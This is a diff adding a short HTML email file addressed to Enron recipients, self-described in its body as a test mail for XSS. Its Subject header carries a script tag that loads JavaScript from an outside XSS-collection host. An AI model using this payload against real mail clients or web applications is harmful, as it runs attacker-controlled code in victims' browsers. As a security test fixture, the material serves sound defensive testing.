@@ -1,0 +1,7 @@
+From: Daniel Glover <rclearman@gilson.e.telefonica.net>
+To: kevin.hyatt@enron.com, lorraine.lindberg@enron.com, 
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
